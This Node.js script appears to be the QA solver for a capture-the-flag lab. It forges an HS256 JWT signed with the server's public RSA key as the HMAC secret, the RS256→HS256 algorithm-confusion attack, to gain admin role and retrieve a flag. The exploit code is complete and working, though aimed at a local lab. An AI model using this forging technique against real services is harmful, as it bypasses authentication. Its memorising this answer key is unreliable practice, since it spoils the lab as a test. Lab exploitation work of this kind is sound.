#!/usr/bin/env node
/*
 * VLH-CTF QA solver — DSLTV JWT/alg-confusion (AlgConfusion).
 *
 * Intended path: log in as a tester → fetch the server's public RSA key (PEM)
 * from GET /pubkey (also published as a JWK at /jwks.json) → forge an HS256
 * token whose HMAC secret is the PUBLIC KEY PEM STRING. The verifier
 * (vuln.js) takes the alg from the token header and, on HS256, HMACs with
 * the public key PEM — classic RS256→HS256 algorithm confusion. Claim the
 * flag at GET /flag/jwt with the gated claim pair (sub=<innocent>, role=admin).
 *
 * Env: LAB (default http://localhost:8119). Vhosts via the Host header.
 * Node 20+ built-ins only. Exit 0 only on a /DSLTV\{JWT-AlgConfusion-\d+\}/ flag.
 */
import http from 'node:http';
import crypto from 'node:crypto';

const LAB = process.env.LAB || process.env.LAB_URL || 'http://localhost:8119';
const BASE = new URL(LAB);
const HOSTNAME = BASE.hostname;
const PORT = Number(BASE.port || 80);
const VICTIM = `victim.target.lab:${PORT}`;
const FLAG_RE = /^DSLTV\{JWT-AlgConfusion-\d+\}$/;
const PROFILE = 'dsltv-jwt-alg-confusion';

const step = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const fail = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { vhost = VICTIM, body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { host: vhost, ...headers };
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    const req = http.request({ hostname: HOSTNAME, port: PORT, path, method, headers: h }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, text: Buffer.concat(chunks).toString('utf8') }));
    });
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const asJson = (r) => { try { return JSON.parse(r.text); } catch (_) { return null; } };
const b64u = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');

async function main() {
  step(`target ${LAB} (Host: ${VICTIM}) — profile ${PROFILE}`);

  /* 1. log in as the known tester → the issued token is RS256 (kid echoed) */
  const lr = await request('POST', '/login', { body: { username: '0xnhsec', password: 'vlh-tester-01' } });
  const lj = asJson(lr);
  if (lr.status !== 200 || !lj || !lj.token) fail(`tester login failed: HTTP ${lr.status} ${lr.text.slice(0, 200)}`);
  ok(`logged in as 0xnhsec — issued token alg=${lj.alg || 'RS256'} kid=${lj.kid}`);

  /* 2. fetch the public key — the "secret" the confused HS256 path uses verbatim */
  const kr = await request('GET', '/pubkey');
  if (kr.status !== 200 || !kr.text.includes('BEGIN')) fail(`cannot fetch /pubkey: HTTP ${kr.status} ${kr.text.slice(0, 200)}`);
  const pubPem = kr.text; // exact PEM string the verifier HMACs with
  ok(`fetched public key PEM from /pubkey (${pubPem.length} bytes)`);

  /* 3. discover the innocent identity via the legit leak endpoint */
  const dr = await request('GET', '/api/directory');
  const dj = asJson(dr);
  const innocent = dj && dj.users ? dj.users.find((u) => u.role === 'innocent') : null;
  if (!innocent) fail(`innocent not found in /api/directory: HTTP ${dr.status} ${dr.text.slice(0, 200)}`);
  ok(`innocent identity discovered: ${innocent.username}`);

  /* 4. forge: alg=HS256, HMAC secret = the public key PEM string (the confusion) */
  const header = { alg: 'HS256', typ: 'JWT' };
  const payload = { sub: innocent.username, role: 'admin', iat: Math.floor(Date.now() / 1000) };
  const h = b64u(header), p = b64u(payload);
  const sig = crypto.createHmac('sha256', pubPem).update(`${h}.${p}`).digest('base64url');
  const forged = `${h}.${p}.${sig}`;
  ok('forged HS256 token signed with the public key PEM as the HMAC secret');

  /* 5. claim the flag */
  const fr = await request('GET', '/flag/jwt', { headers: { authorization: `Bearer ${forged}` } });
  const fj = asJson(fr);
  if (fr.status === 200 && fj && fj.flag && FLAG_RE.test(fj.flag)) {
    ok(`FLAG ${fj.flag}`);
    process.exit(0);
  }
  fail(`/flag/jwt rejected the forged token: HTTP ${fr.status} ${fr.text.slice(0, 300)}`);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'EHOSTUNREACH')) {
    fail(`lab not running (${e.code} on ${LAB}) — start it: docker compose --profile ${PROFILE} up -d`);
  }
  fail(e && e.stack ? e.stack : String(e));
});
